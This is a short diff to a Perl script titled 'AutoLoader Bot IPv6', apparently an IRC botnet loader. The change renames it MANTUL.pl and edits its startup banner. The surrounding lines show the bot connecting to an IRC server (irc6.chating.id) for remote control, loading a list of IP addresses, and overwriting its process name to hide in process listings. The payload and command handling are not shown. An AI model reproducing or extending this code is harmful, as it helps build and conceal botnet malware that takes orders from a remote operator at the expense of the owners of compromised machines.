@@ -1,6 +1,7 @@
 #!/usr/bin/env perl
 ##################################
 ## AutoLoader Bot IPv6 by iJoo  ##
+##          MANTUL.pl           ##
 ##################################
 use IO::Socket::INET6;
 my $server = "irc6.chating.id";
@@ -13,7 +14,7 @@ $SIG{CHLD} = sub { wait };
 @ips = grep { s/\n$// } @ips;
 $0 = $procname . "\0";
 my $jumlahip = scalar(@ips);
-print STDOUT "\n+ BOT IPv6 Loader\n";
+print STDOUT "\n+ MANTUL - BOT IPv6 Loader\n";
 print STDOUT "+ Server : $server\n";
 print STDOUT "+ Port : $port\n";
 print STDOUT "+ Admin : $admin\n";
